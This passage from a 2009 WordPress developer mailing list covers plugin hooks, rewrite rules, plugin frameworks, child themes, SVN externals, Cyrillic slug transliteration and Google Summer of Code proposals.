still feel a personal attachment to WordPress, and I hope the project
continues well into the future.

Thankyou for being part of my life -- both WordPress itself, and the
community that surrounds it.

Jeremy.

Currently I use the Moxiecode_JSON class, but this involves a fairly
contorted require, ie:

  require_once( ABSPATH .
"/wp-includes/js/tinymce/plugins/spellchecker/classes/utils/JSON.php"
);

I've grepped through the WordPress code for 'json' and can't see
anything, but is there a more convenient class or function I could
use?

WordPress seems to use mostly XML responses when it needs to send back
complex AJAX data (more complex than a status code or HTML). Look at
the WP_Ajax_Response class.

Message-ID: <59e7f3130903170649hbd46301t7c1d771822807fae@mail.gmail.com>

I'm looking for the right place to hook for pages like
www.site.com?custom_content_id=3
add_action('parse_query') does not work when there is nothing in the query

adding  'custom_content' as a query var ( fill_query_vars) could be
good, but there is no action between fill_query_vars and the main
parse_query process
a manual $wp_query->fill_query_vars(array('custom_content','custom_content_id'))
on init does not work either.

Malaiac

(the next question will be :
and what if I want to have rewrited custom content like
www.site.com/custom_content_3.htm  ?
I've already added some custom permastructs & custom rewrite tags)

Hi
Is that file available for download anywhere? I'd LOVE to see what it looked
like (before my time).

What I do for situations like this is add a rewrite tag for the query
var, in a callback for the init action.

add_action('init', 'my_init');
add_action('parse_query', 'my_parser');

function my_init() {
global $wp;
$wp->add_query_var('custom_content_id');
}

function my_parser() {
$custom_query_var = get_query_var('custom_content_id');
if ( ! empty( $custom_query_var ) ) {
[ do stuff ]
}
}

Do you need to flush rewrite rules after doing something like that?
Not flushing (ahem) was something which caught me out when creating
custom taxonomies recently.

OK, I used SVN and checked out the whole SVN directory. The 
makepot.php file now runs, but it is not putting the plugin meta-data 
into my POT file.

My plugin header has lines like:

Description:
Author:
Plugin URI:
Text Domain:

and I have run the script, following the instructions in
http://codex.wordpress.org/I18n_for_WordPress_Developers, using the 
command:

php makepot.php wp-plugin your-plugin-directory

A POT file is being generated with the __() and _e() function 
contents, but the meta-data information is not getting into the POT 
file. What else do I need to do to make this happen? Or am I 
misunderstanding the purpose of those scripts?

Thanks,
    Jennifer

You only need to flush rewrite rules if you are using one of the 
actions/filters that creates new rewrite rules. The reason for 
flushing is that the rewrite rules are saved in the database after 
they are generated, rather than being generated on each page load, so 
you have to tell WP that it needs to create a new set of rules.

The actions below do not affect rewrite rules, so you don't have to 
flush them.

I said "add a rewrite tag" when I meant "add a query variable."

Austin may be right that you need to flush rewrite rules.

No, what you said before is correct.  Although custom query variables
often involve rewrite rules, they don't necessarily require them, so
the query variable functionality per se does not require one to flush
the rewrite rules.  You would need to flush them once if you're
creating a rewrite rule for that particular custom query variable.

Use the native JSON object if you are on PHP5: http://us.php.net/json
Then use jQuery to parse it.

The main developers say custom taxonomies is coming in 2.8.  In the meantime
I wrote this plugin:

http://wordpress.org/extend/plugins/custom-taxonomies/

That doesn't exactly answer your question about binding a taxonomy to a
type, but the structure of the DB doesn't really allow for anything else
right now.  It's a change I could see them making in the future, but not for
a while (IMHO, as I'm not "tight" with the core dev team).

Fuck yeah. +1 for that thought. As the other Jeremy I have to say WP
got me in and its the reason everything is going the right way. Maybe
it could have been another PHP app but I have no evidence that
anything else is even close to as cool.

Subject: [wp-hackers] Strider Core plugin framework
Message-ID: <69764167-686A-42E2-8D15-1F817F7B8E28@striderweb.com>

Hi all --

This has been in the works for a while, and it's not complete, but  
going by the "release early and release often" philosophy...

I'd like to introduce you to Strider Core.

http://code.google.com/p/strider-core/

Straight from the readme and source:

Strider Core is a framework for use in other plugins.  It is not a  
plugin unto itself.  It includes many points of minor functionality  
and polish, such as Settings page links from the Plugins page, and an  
attribution in the footer of the Settings page.  A significant feature  
is the ability to activate integrated version checking for plugins not  
hosted on WP-Extend.

Strider Core also has an interesting feature in that if multiple  
plugins are built on it, they will all use whichever is the highest  
version present.  Thus, upgrading one plugin can improve all of the  
Strider Core plugins.

NOTE: This framework is still in early development, and thus
	functions may not be entirely stable.  There is no guarantee
	that later pre-1.0 versions will be backward compatible.
	As a public framework, consider it alpha, folks!

How Strider Core versioning works:
  * Every Strider Core plugin loads its own strider_core.php file.
  * The first strider_core.php to be loaded creates the  
load_strider_core()
	function, and sets it to run on the plugins_loaded hook.
  * For each strider_core.php file, the __FILE__ and version (above)
	are loaded into $this_strider_core[], and then passed into
	the $strider_core_info[] array.  $this_strider_core[] is unset.
  * After all plugins are loaded, load_strider_core() runs, in which
	$strider_core_info[] is UNset, and the strider_core.php
	file with the highest version is loaded again
  * This time, the strider_core class is created.  (also,  
$strider_core_info
	is recreated, with data for the current strider_core file only)
  * Finally, the list of Strider Core plugins is looped through
	and each SC plugin "main" file is loaded.  Those files are
	the heart of their respective plugins.

  In the end, you are left with:
	* global $strider_core_info[], which == the $this_strider_core
		array from the top of the active core only
	* global $strider_core_plugins[] -- keys are the plugin
		basename and ['core file'] the "main" file full path for every
		active Strider Core plugin
	* ...and of course, the strider_core class

Known Limitations:
	* "main" plugin file isn't called until plugins_loaded hook.  This is  
soon after normal plugin load, but some things do happen before that.   
Such as...
	* activate and deactivate hooks don't work from the "main" plugin  
files, because those files aren't called until after those hooks are  
fired.

  * Future compatibility note: If an upgrade is ever significantly
	non-backwards compatible, we can simply create load_strider_core_2()
	which will only load legacy SC1 code if needed.  The code that
	hooks plugins_loaded will also un-hook the old load_strider_core()
	as needed.

Known Issues:
	* The Version Check routine is not complete.  Fully WP integrated,
	but lacks the actual code that goes and checks a server for a new
	version.  You can test by upping the version returned by
	filter_set_update_plugins()
	
	* As it is set up currently, the register_version_check_header()
	function is dependent on http://trac.wordpress.org/ticket/8964
	(Though it is not yet used in this beta -- it will be called
	from filter_set_update_plugins() )

	* You can't use activate or deactivate hooks, as neither the
	strider_core_b1 file, nor the "main" plugin file, are called as of
	actual plugin activation/deactivation.

To Do:
	* Fix activate/deactivate hook problem.  Probably can hook a simple
		"container" function from the main plugin file.
		* see core_activate function

Each Admin page should have a second tab for "Strider Core" universal  
settings:
	* Toggle Version Check (default true)
		* Toggle - include compatible non-Strider Core plugins
	* Toggle menu icons

Version Check routine:
	* TEST INPUT of "Version Check URI" w/ wp_kses();
	* fetch latest versions --> TEST INPUT of returned string w wp_kses()
	* after_line_$plugin hook:
		* "skip this version" button ? (use nonces)
		* "Disable updates for this plugin" button ? (use nonces)
	* update_plugin may be written twice per check (in WP) - once for  
update
		time, and once for actual results.  Only run our update routine once!


/* License:
	Strider Core is released under a modified GPL2 license.
	The modification is as follows:
	
	1. If you make _any_ changes to the code, other than for purposes
	of private testing, you are required to change all in-code instances
	of the string "strider_core" -- do a search/replace and replace
	"strider_core" with something unique, e.g. "<yourname>_core".

	2. Do not perform the above replacement using anything containing
	"strider_core".  That is, don't call it "strider_core_2" or
	"my_strider_core" or something.  If you modify it, it isn't
	Strider Core, so really rename it.  (Yes, something very much like this
	has happened in the past.  Somebody branched a program of mine and
	renamed it by adding a "2" to the end. :-\ )

	3. File names and directory names must be similarly altered
	per #2.
	
	4. If you do not do the above (#1, #2, and #3), then Strider Core
	MUST NOT BE MODIFIED IN ANY WAY.
	This is important, because otherwise your modifications could
	adversely affect plugins or software *other than your own!*
	
	--

	If you make modifications and come up with something good,
	please let me know -- I may add it to the original.  :-)

Stephen Rider

Subject: [wp-hackers] Plugin base classes
Message-ID: <78FF93E9-A97C-4B84-9241-54E8CDA20536@sweetinteraction.com>

Hi,

Prompted by Stephen's Strider message yesterday:

What do people use in the way of plugin base classes when developing,  
and why do you use what you use?

I'm using Joghn Godley's plugin base class, which I've found really  
helpful. The main issues I've hit is needing one instance of the class  
file per plugin; which makes the Strider thing interesting. I've been  
wondering about creting dependencies in my plugins, so one plugin  
won't work unless you have another installed, but this does seem  
complex and I wasn't sure how to make it nice for the user (however  
with the new built in plugin install and update it seems more possible).

Thanks.

I use my own plugin base classes:
http://code.google.com/p/scb-wordpress-plugin-framework/ :)

I use them mainly because they are required by most plugins. Another
advantage is code reuse: if you have more plugins that use the same class,
it is only loaded once. I think that applies to most plugin bases.

Awesome! No comments. Just awesome!

Any plans on implementing custom objects feature?

except a little thing: quite every theme around here is built with  
blogs in mind.
would be nice if WordPress ships a future release with another built- 
in theme, less blog and more CMS-y
time to have a new kubrik perhaps? :-)

Look in downloads.

Google Code went "read only" yesterday for maintenance, so I only had  
time to put up the demo.

Good suggestion

I am trying to market wordpress to new web clients of mine as a CMS
solution.  However, EVERYTIME I show wordpress.org .com etc to them so they
can learn about it, the FIRST thing they say is they do not want wordpress
as they do not want a blog.

Grady, good on you for considering a GSoC application. I know you have
put a lot of thought into it.
I don't want to sound negative here but I think you are working on a
flawed premise.
I am a Mambo developer and also hack WordPress. Both can have a home
page that looks like a static HTML page, but both can also look and
behave just like a blog.

I have one site, which unfortunately is down at the moment in protest
against copyright law changes, which is built with WordPress and which
is not used as a blog. It started life as a Mambo site and anyone
going to it would not be able to tell the difference.

There are loads of reasons why I would use Mambo for some sites and
WordPress for other sites, but CMS functionality is not one of them.
WordPress is a CMS that people generally use as a blogging platform.
Because it is flexible they don't need to use it as a blog though.

I think that you will find it difficult to do anything with the GSoC
to make WordPress act more like a traditional CMS.

I notice they are PHP5 only which may be a show stopper for some people.

I had used phpHtrmlLib (http://phphtmllib.newsblob.com) for a couple
projects before I started working with WordPress.  When I started
working on my WordPress SwimTeam (http://www.wp-swimteam.org) plugin I
wanted to use phpHtmlLib because what I was building is very forms
intensive and I didn't to give up what I had used before.  The author
of phpHtmlLib had moved on to a PHP5 only version (3.x) allowed me to
continue contbute to the 2.x (PHP4) branch which I then enhanced to
work as a WordPress plugin.

I rely heavily on phpHtmlLib's form processing and widgets classes,
not having to reinvent the wheel for a lot of stuff has saved me a ton
of time.

Of course WP is already a CMS by any meaningful definition - so maybe the
question is... why doesn't it get branded that way internally? I've created
a custom language file the I use which replaces most core references to
"blog" with "site" so that when I setup WP for clients I don't have to
constantly explain that WordPress is more than just a blog engine.

No, because I feel that would require too much of a change to the database
structure, and I'm trying to minimize the number of extra tables (now it's
only 1).

Hi all: 

I pretty much completed launch of a big social media project based on WordPress for my client (and their client is a local Fortune 50 company.) Unfortunately they don't want me to publicly point it out as a WordPress site as they fear being hacked, but I am proud of the work I did on it and would like to release some of the plugin functionality I developed for it. I'll need to "clean up" before publicly releasing but I have two things I'm trying to figure out: 

1.) Where's the best place to host the source code? Google code, or somewhere else? 

2.) For those who have plugin projects that are independent of a specific website but for which you use on more than one of your WP sites, how do you manage the version control? Do you keep in a "Plugins" directory outside of a WP project somewhere and then have some type of project that keeps the most recent version of your original source in sync? Or maybe this is something than a Subversion client can handle on it's own? 

I appreciate any input. I know we discussed topics related to #2 about 6 weeks ago but I was unfortunately not at a point then where I could devote any time to exploring and the details has since become too fuzzy to recall (even after re-reading some of those old messages.) Thanks in advance.

If you're planning on submitting it to the official WordPress plugin
directory, then it manages source code via a Subversion repository
(e.g. one of mine: http://svn.wp-plugins.org/sparkplug/). Once you
submit and get it approved, they'll send you details on accessing it.

Or maybe this is something than a Subversion client can handle on it's own?

Personally, I manage them through SVN (either through the official
repo, or through one of my own) and then check them out to the server
where I'm hosting the custom site. Depending on how things operate
(e.g. for WPMU installs I do it sometimes), I check out the files to a
specific location (~/svn or something) and then symlink the required
files into place in the (mu-)plugins/ directory.

Hi

 I am an undergraduate at the University of Moratuwa specializing in the
field of Computer Science and Engineering and willing to take part in
Wordpress during this summer. I participated in Gsoc last year with Sahana
community where i involved in implementing a project relating to social
networking and i completed it successfully [1] . There i experienced many
things relating to social networking

  i am really interested in BuddyPress project as most of the methodologies
needed are lying in the path of my experiences. Further it would be really
important in poing of WordPress.

  i am glad to know more about this project. like would it need managing
user groups , photo album features and other common features in a social
networking system etc.

Message-ID: <6a74c4e20903190103l6d776c2cwb16fbb93ce6e503b@mail.gmail.com>

Hi all,

During my involvement with Sahana <http://sahana.lk> project I have
developed a Javascript library to automate the process of generating the
Handwritten Character Recognition friendly froms out of the active Web
forms. Some illustration can be seen through vising my personal
blog<http://thoughtsandideas.wordpress.com/2008/03/03/status-with-ocr-friendly-form/>
.

My intention of this effort was to devise a mechanism to develop generic
functionality that could be adpted to work with most of the popular Web
browsers, that provides the facility to format the Web forms to a more user
friendly printable form that could be useful in collecting information in
offline(paper based forms) situations (surveys, disaster situations, etc)
with minimum effort. The collected data(through generated paper froms) can
be later digitized and extracted through Handwritten Character Recognition
module(that involves Image Processing).This mechanism can be used to extend
the functionality of the Wordpress.


I'm Hayesha Somarathne, final year student reading for my B.Sc in
Information Technology, University of Moratuwa. I have being contributing to
Sahana <http://sahana.lk/> project for nearly two years. Recently I got
myself selected as one of the core
member's<http://wiki.sahana.lk/doku.php?id=dev:team>of the development
team.


Thank you.

Hi all,

Firstly pardon me for flooding the list

For the above idea I would like to hear your comments and suggestion on what
ways I can improve my approach to come up with better solution.

I have played around with Wordpress CMS for quite some and have good
understanding of theme development as well.

Thank you.

Message-ID: <20090319114316.GM19377@ladjo.ath.cx>

So I'm plowing away at my first WP-setup for "real" a client. (one
that actually pays me). I'm putting all the customizations in a plugin
so as to make them more future proof then plain hacking to the
WP-core. This way it's easier for the client to take the plugin code
and hand it to another developer if the get tired of me.

But what do I do about customizations to the theme? I'm using Thematic
as a starting point. Right now my strategy is to just copy the
thematic code to a different directory and hack away at it. This won't
be any good at all when the next version of thematic comes along and I
have to merge my revisions and those of the Thematic core.

What do other folks do?

Hi Harsha,

With my experience with BuddyPress its no different than any other social
networking system, in terms of features it has and it could have. so better
you explore yourself to find out that more you could add to this...

Good luck

Child themes are the way to go.

The best thing to do is make a Child Theme of your base theme (in this case,
Thematic). You can use functions.php in your Child Theme template to filter
and hook into base theme functions and filters, and WordPress functions and
filters.

It's pretty easy to make a Child Theme (and especially easy to make a robust
one with Thematic). Here's a quick tutorial to get you started: <
http://op111.net/53>. Thematic includes a sample Child Theme that you can
copy into wp-content/themes.

For more advanced edits with Thematic check out the ThemeShaper forums <
http://themeshaper.com/forums/> or the Thematic Code Snippets project <
http://www.wupperpiraten.de/kategorie/thematic/code_snippets/>.

Message-ID: <7559d6930903190628p28e1dfabw605165a12a362324@mail.gmail.com>

Hi,

I'm planning to apply for WordPress in GSoC 2009, having worked on WordPress
and PHP for the last couple of years. I'm an undergraduate at University of
Moratuwa specializing in Computer Science and Engineering.

I'm more interested in the idea on User Roles mentioned in GSoC2009 page on
codex. I've been using couple of user role plug-ins for WP in some of my
blogs because the current system couldn't do all that is needed.

I would like to hear from the WP hackers on what features could be added in
User Roles, and I would like to know more about this project idea in the
context of GSoC 2009.

Thanks.

Hi Beau:

Thanks for the response. I found this http://wordpress.org/extend/plugins/add/ and submitted a request to add my first releasable plugin to the directory.

Currently I still develop on Windows and it doesn't have symlinks. I also keep my test versions on my laptop in working condition and am looking for a more streamlined (automated) way to keep plugins in sync instead of having to manually export them to each and every project. Anyone handle this process differently?

> 1.) Where's the best place to host the source code? Google code, or somewhere else?

If you're planning on submitting it to the official WordPress plugin
directory, then it manages source code via a Subversion repository
(e.g. one of mine: http://svn.wp-plugins.org/sparkplug/). Once you
submit and get it approved, they'll send you details on accessing it.

> 2.) For those who have plugin projects that are independent of a specific website but for which you use on more than one of your WP sites, how do you manage the version control? Do you keep in a "Plugins" directory outside of a WP project somewhere and then have some type of project that keeps the most recent version of your original source in sync? Or maybe this is something than a Subversion client can handle on it's own?

Personally, I manage them through SVN (either through the official
repo, or through one of my own) and then check them out to the server
where I'm hosting the custom site. Depending on how things operate
(e.g. for WPMU installs I do it sometimes), I check out the files to a
specific location (~/svn or something) and then symlink the required
files into place in the (mu-)plugins/ directory.

Hi Nimal:

I'd like to see named roles and ability to assign rights to user roles as well as assign users to roles both on a user admin page as well as on a role admin page.  I'd like to see a system that supports defining an effectively unlimited number of different type of rights where a plugin could define its own rights such as "User can Rate Post", "User can Upload Avatar", "User can Edit SEO Options" and so on. 

Lastly, the checks in code for these rights need to be highly optimized so that adding user management does not add significant processing overhead to plugins (and possibly core) that may use it.

Does this help?

Yeah, that's kinda cool, but I've learned the hard way not to get too used to a process that depends on a feature provided by an add-on that really should be part of core if it's going to be there (core O/S, core app, etc.)  Especially something that is freeware and may not get upgraded for the next major version.

Well, it IS apparently part of the OS, since Windows 2000 -- it is  
just very poorly documented.  Sometimes called "Junctions", and I've  
seen other terms as well....

Role Manager already does all that pretty well.

While I'm very enthusiastic about roles (and have written several
patches that clean up the implementation of capabilities in WP) I have
to agree with this. I think that the kind of hardcore role/cap
management we're talking about really is the domain of plugins. Most
sites just don't have enough users to worry about it and as long as
there's a great plugin for it (i.e. Role Manager) its easy for those
who want to mess with it to do so.

If anything it would be great if someone would take over RM for the
guy who runs it now, as he doesn't seem to have a lot of time for it,
and put it up in Extend and stuff. I'd love a community around the
plugin, but so far I don't feel confident about committing to managing
it myself.

Message-ID: <485dd1460903191149n49d4218es87a5f99c78c761e9@mail.gmail.com>

Hello all,

I want to include the header and footer of my WordPress page on a
non-WordPress PHP script residing in the same server on a different
directory. I am using the following code on top of my non-WordPress page

require("../../wp/wp-blog-header.php");

get_header();

The above code works fine, but WordPress sends a 404 error code to the
browser together with the page content. Can anyone tell me how to prevent
it?

Also let me know if this is the proper way to do it or is there an alternate
way to do it.

Thanks!
With Regards,
Sudar

Basically I have category links hardcoded into my theme template like so: <li
id="nav-linkt" <?php if (is_category('cat')) { echo "class=\"active_link\""
; } ?>>
<a href="<?php echo
get_category_link(get_category_by_slug('cat'));?>">Cat</a>

which is fine but if the category doesn't exist (in the example above 'cat')
then the theme bombs.

Is there a way to wrap this list item with something like <?php if
category_exists { ?

I know that function doesn't exist but anything similar without having to
hard code a query?

To see if a category with ID 123 exists, you could do:

$cat = get_category(123);
if ( ! empty( $cat ) ) {
// do something;
}

And beyond child themes, Thematic is more of a framework, too. There  
is a 'clean' way to develop with it, so that the core theme can be  
left intact and provide you an upgrade path with the theme, and keep  
your customizations separated, much like you're doing with your plugin  
code. The same methodology applies here too.

Ozh,

Thanks for the reply.

I have this code in a file called index.php inside a directory (say test)

If I enter the full url http://mysite.com/test/index.php then I get 200
status code. But if I enter only the folder http://mysite/test/ I get the
page content by with the status code 404.

Do you have any idea why this occurs?

With Regards,
Sudar

You probably need to put a .htaccess file in that directory that tells 
Apache that the default for mysite.com/test/ is to visit the index.php 
file. That's not necessarily standard. It is probably looking for an 
index.htm or index.html file, not index.php, hence the 404 error.

Having not looked into it fully, I'm not sure exactly what the 
.htaccess syntax would be for that, but maybe that gives you something 
to go on?

Hi for all,

I want to apply for WordPress in GSoC 2009, having worked on WordPress
and PHP (CakePHP, and others) for the last five years. I'm a student
from last year of Computer Engineering in University of Concepci?n
(Chile).

I'm interested in "enhanced search", but I need more explanation
(maybe examples) where to use this function. So, please mentors,
entors could talk more about the enhanced search.

I'm interested in MPTT too, I read about this and is pretty cool ;).

Thanks, and reply ;)

My recommendation, use subversion externals.

I really should write this up better as it is fairly simple (I don't  
have a live site running this way yet but I have a testbed setup this  
way)

1) Create yourself a brand new subversion repository (to try this  
locally you can use tortoisesvn)
2) Create your wp-config.php and add it to the root of the repositiry
3) Edit the subversion property svn:externals as follows:

==start==
#WordPress core
public	http://svn.automattic.com/wordpress/tags/2.7.1
#Plugins
public/wp-content/plugins/wp-contact-form               http://plugins.svn.wordpress.org/wp-contact-form/trunk
public/wp-content/plugins/wp-super-cache                http://plugins.svn.wordpress.org/wp-super-cache/tags/0.8.6
public/wp-content/plugins/wp-db-backup                  http://plugins.svn.wordpress.org/wp-db-backup/tags/2.2.2
#Theme
public/wp-content/themes/blog-theme                     https://example.com/theme/trunk
==end==

Swap public in here for public_html or what ever is relevant.

All of the urls are to subversion repositories.

Then you create a checkout on the webserver such that the root of the  
website is the subfolder called public above and hey presto you have  
it all pulled automatically from disparent svn repos.

If you want to store the theme in the same repository then this can be  
done and the external can be a reference to a different location in  
the repo

Cheers

westi

It would be great if you could see the read-only svn URLs for plugins  
in the extend db on the plugin page. I know right now its on the admin  
tab of plugins you manage, but being able to easily get the svn URL  
for power users would be the most amazing thing ever. You can kind of  
guess the URLs but since many addresses and plugin names aren't exact  
(including with some of my own) it is an error prone process. I'm a  
big fan of svn:externals and would love to be able to pull the source  
of plugins directly into my svn managed WordPress sites, just like I  
do for the WordPress core files themselves.

You should be able to just do the following (using my own as an
example, although don't know for sure that's always the case).

Plugin page: http://wordpress.org/extend/plugins/sparkplug/
SVN URL: http://svn.wp-plugins.org/sparkplug/

So just replace "wordpress.org/extend/plugins" with
"svn.wp-plugins.org" and you have the URL (although in my case, you
also need /trunk/ on the end).

You're right though, it would make sense (and make life easier) to
just have the corresponding URL appear on that page so you could
easily copy-paste. Perhaps even have an automatically generated page
that describes the checkout/externals details for using that plugin
(could be linked under the Download button?)

+1 for this.

Hi to Wordpress enthusiasts,
I am Anuja Hariharan, student of National University of Singapore. I am
interested in the Advanced search project of GSoC, and would like to know
what kind of features you are looking for (apart from combinational searches
of categories, tags and text). Are you looking at searching within the blog,
or also searching within the blog's inward and outward links? Is it to be
developed as a widget, or a standard feature?  And where I can find the
current code for the Search functionality in order to get a grasp?

I am new to Wordpress development, but I have some experience with PHP and
XML handling, specifically in search functions. I am now trying to figure
out the maze, and its pretty interesting!

Any light you can throw would be useful ..

Regards,
Anuja Hariharan.

If you're in the admin area you can use the following conditional:
if ( category_exists('category_name') ) { ... }

If you're not in the admin, you just have to reference is_term:
if ( is_term( 'category_name' , 'category' ) ) { ... }

In the second example, "category" needs to remain category, but
category_term is the title of the category your checking for.

Ugh. Is it just me, or does anybody else find xref to be bloody
useless? I mean, it gives you almost no useful information about the
function other than its name and where it's called from.

Here you go:

It gives you the complete code, what more do you need? :) We're working 
on an integration of wplookup and my xref, so you can choose to go to 
either the phpdoc or the xref :)

It's the php xref in general that just bugs me.. Lots of links, no
idea what any of them do without practice.. It's just unintuitive as
hell and hard to use and learn.

xref has just always been seemingly totally useless to me, unless you
know what you're looking for already, in which case you really
wouldn't need the xref, would you?

It's a poor substitute for documentation, and more often than not, a
simple grep through files is faster and more useful than trying to
figure out the xref, which makes me wonder wtf the point of it is.
What can you do with xref that's faster than doing it without xref?
Where's the benefit?

Message-ID: <25ec3df30903200833v4a847532r9bca2ce9a90c0868@mail.gmail.com>

I've written a few small plugins, but I'm looking for the "best practices" -
Google gives some results, but no doubt some on the list may have written
articles/posts/email threads that fall in line with this ideology but not
match the wording.

I'm looking in terms of:
Best methods of hooking in your JS/CSS (I remember an email thread awhile
ago about plugin authors doing it improperly, but I can't turn it up - yet).
Best ways to interface with the admin panel
Cacheing/giving the user control on CSS/JS

Any pointers, tips, links appreciated.

Thanks!

suggest functionality which is faster for me then grepping...

Xref is pretty awesome... I spend a lot of time in the function list,
and use it to see how many times and where a function might be called,
etc. It's an invaluable tool. I use grep at the command line as well,
but it's nowhere near as fast as using xref. I'd never use as xref for
documentation purposes, I use it to make sense of the code whenever
I'm looking at an area that I'm not familiar with. It's also decent as
a purely technical reference.

Subject: [wp-hackers] Helping international users by fixing this code
Message-ID: <9b6c20460903200938s1cf5d5e5ma2ab53fe3d8e7f36@mail.gmail.com>

Hi everyone

I didn't post to this list before, but since I believe this is the only
place where I could get solution, I'll ask here about one issue.

I already asked about this on forum (
http://wordpress.org/support/topic/249624 ) two weeks ago but didn't get any
reply, so here is copy of that post, with detailed description of problem.

As it is known, when using custom permalinks, titles of posts, categories,
tags are used in urls. There are some functions for Latin scripts that do
converting from non-English letters to English one (i.e. ?ljivi? becomes
sljivic in URL).

But problem is with non-Latin script. For example, in Serbian language we
use Cyrillic script but in URLs we use English letters, so to achieve this
in WordPress we manually transliterate to English letters, so that *??????
?????* became zdravo-svete, not ??????-?????, which is actually shown as
%D0%B7%D0%B4%D1%80%D0%B0%D0%B2%D0%BE-%D1%81%D0%B2%D0%B5%D1%82%D0%B5 . So we
want that this transliteration is done automatically.

Since this is not exclusively related to Serbian language, developers from
other languages already worked with this and made several plugins but all of
them have one issue that should be fixed.

Two plugins that have slightly different code make same results and they are
close to how they should work are MK to Lat (
http://wordpress.org/extend/plugins/mk-to-lat/ ) and Rus-to-Lat (
http://mywordpress.ru/plugins/rustolat/ ).

If we install any of this plugins, all Cyrillic letters from titles of
posts/pages/tags/categories are transliterated to Latin one in URL slugs for
new posts/pages/tags/categories, but problem is that if there are already
posts/pages/tags/categories with Cyrillic letters, those pages return 404
errors. (just to note that if we turn off plugin everything works without
problem)

Example:
Lets say we have post with title *?????* and URL
example.com/?????<http://example.com/%D1%98%D0%B5%D0%B4%D0%B0%D0%BD>(which
will in address bar look like
example.com/%D1%98%D0%B5%D0%B4%D0%B0%D0%BD ). This page is opened without
problem. Now we install one of two plugins above; we make new post titled *
???* but we now don't get URL
example.com/???<http://example.com/%D0%B4%D0%B2%D0%B0>(
example.com/%D0%B4%D0%B2%D0%B0 ), but instead get what we wanted,
example.com/dva .
Until now everything looks like there is no problem. But if we try to access
page example.com/?????
<http://example.com/%D1%98%D0%B5%D0%B4%D0%B0%D0%BD>we get 404 error.
If we turn off plugin, we could again access that page
(and also second page) without problems. If we again turn on plugin, we
again can't access first page.

So, problem is with old slugs that contain Cyrillic letters.

How should plugin work: for new slugs it should work as it works now, but it
shouldn't touch other slugs made before plugin's installation.

I will put code of both plugins below (without comments from top of files;
code also available on http://wordpress.org/support/topic/249624 ). If there
is need for further explanation I'll try to explain it. Thanks in advance

If I didn't misunderstand your problem, you can do the same I did for
a plugin I wrote [1]:

With the following snippet you won't have the 404 problem because
sanitize_title_with_translit will be called only for the posts that
are saved.
...
function __enable_fix($post_name) {
	add_action('sanitize_title', 'sanitize_title_with_translit', 0);

	return $post_name;
}

add_filter('pre_post_name', '__enable_fix');

 I`m not a developer, more a user, but would like to propose a feature
additional for your project.

1. The possibility to set links to be in a a popup/new window to:
2. Serve content with no header,footer,sidebar,nav, - just the content.

I will be useful for serving different kinds of rich media within a
page/post in a "clean way".

Look at wp_enqueue_script and wp_enqueue_style, tgese wrap the methods  
of the $wp_scripts and $wp_styles objects other methods off which are  
also handy (localize method of scripts for passing dynamically  
constructed data like, but not restricted to, translated strings, and  
the conditional (I think) method to use IE conditional comments).

I'd be interested in any way of getting my scripts and CSS cached by  
the Gears powered Turno feature; anyone?

I guess I'm just not seeing it. No worries, different people use
different tools, but xref seems to be too intrusive to. It gets in my
way instead of helping me find what I want.

Thank you for your reply! If Google Translate did good job, then in your
post about plugin you described same situation as I did, only difference is
that you had problem with other characters.

Your fix is partly working. (just to note that I need to remove line with
add_filter I had in original plugins). Old posts with Cyrilic letters can be
accesed but it doesn't completely work for new posts (meaning that we came
in situation we have before plugin :)).

First, on preview of slug on write page, slug is not transliterated
(although it is when post/page is published). Then slug for category is not
transliterated. Next, when writting on dashboard via Quick Press, nothing is
transliterated. And at last when creating new tag or category witout manual
enter of slug on its own editing pages (edit-tags.php and category.php)
again transliteration is not working. All of this worked without your fix.

So your code is not complete solution, and you should check if your plugin
is working as it is intented with newest version of WordPress (maybe that is
problem).

Thanks again

It is a bit of a shame.

I don't know the exact reason why it is built up the way it is without  
including most of the core WordPress files so as to allow plugin hooks  
etc.

I think it would be interesting to see if there is a technical reason  
(apart from speed) that this file is not more dynamic - I guess that  
is a question for Andrew and I hope he will pipe up)

It is one of the files that doesn't read like poetry to me ;-)

+1 on the more dynamic idea. Because then it could be reworked to be
capable of being an HTML5 manifest file as well, allowing for the new
Firefox/WebKit to make use of it too.

in the parsing code you should be able to do

if (is_feed())
     return $output;
else
     return;

that would probably work.

My Gears-fu is weak, so before I go diving into lots of pointless
research... can you write another manifest (?) file for the same
WordPress installation, so you add another Gears store of files stored
offline on the same site?

Actually I haven't checked WP codebase in a long time, so I don't know
what changed. The idea is simple, you should only fix permalinks when
(post, category, tag, ...) slugs change.

Message-ID: <1fe4fa230903211928h276716f5p50f266fdcfd17953@mail.gmail.com>

I'm thinking of applying for a GSoC slot this summer.  Here's the
beginnings of my idea.  If anyone has any feedback, I'd appreciate it.

This ties in a bit to the 'User Roles' project suggestion on the wiki,
but goes in a slightly different direction.  It could encompass the
ideas mentioned there or not.  I'm interested in adding a moderation
workflow to WordPress.  If WordPress is a CMS (not to touch a nerve),
then such a system that controls the flow of information from the
brains of the authors through the hands of editors/managers into the
eyes of the public would be useful.

I think what I'm proposing would make the most sense as a plugin, as
most people probably don't need a full publishing workflow on their
one-person blogs.

Typical use cases might include:
* category editors - to be published in a category, a post/page must
be approved by an editor for that category
* the big boss - everything that gets published must get the ok of the boss
* writer->editor->designer - the writer writes text, which is edited
by the editor, and then made pretty by the designer
* Is limiting an author to a category just a simple workflow case or
something different?

The major pieces of the plugin would be:
* interface for designing the workflow, could have multiple stages,
stages dependent on category...
* notifications when a post/page reaches the next stage of the workflow
* moderation comments and sending the post/page back to the previous
stage of the workflow
* lots of hooking into capabilities to force things into the workflow.

Here's a bit of personal background.  I developed a simple workflow
plugin called Zensor for a high school in Germany.  It hasn't been
updated in a long time and isn't designed to facilitate the above
ideas.  I did some theorizing about workflows in WordPress on the
codex (http://codex.wordpress.org/User:Scompt/Workflow_With_WordPress),
but never took it any further than that.  I've done some WordPress
consulting while at university, including developing plugins and
complex WP-based sites.

Thanks for your feedback!
Edward

There's nothing really preventing you from creating a script that
creates your own managed resource store, but linking it in with the
main WP Turbo function is a bit trickier.

The wp-gears script is enqueued by the Tools menu section, so you'd
want to deregister that script and register your own in its name
("wp-gears"). Your script would basically be a copy of the existing
wp-gears.dev.js file, with additional bits in the createStore section
to create your own store and give it a manifest as well.

Alternatively, you could have it load a different manifest file
(instead of creating your own store), then running the existing
manifest program within that, then use output buffering to insert your
bits into it. That's more complicated, but a bit cleaner in the end.

Regardless, it's still a poor solution either way. You're having to
override existing code instead of happily adding bits to it.

And honestly, there's not much I can think of that a plugin should
need to store in the gears cache. Few images, perhaps, maybe some CSS
and such. But how many plugins have a lot of those? Remember, the
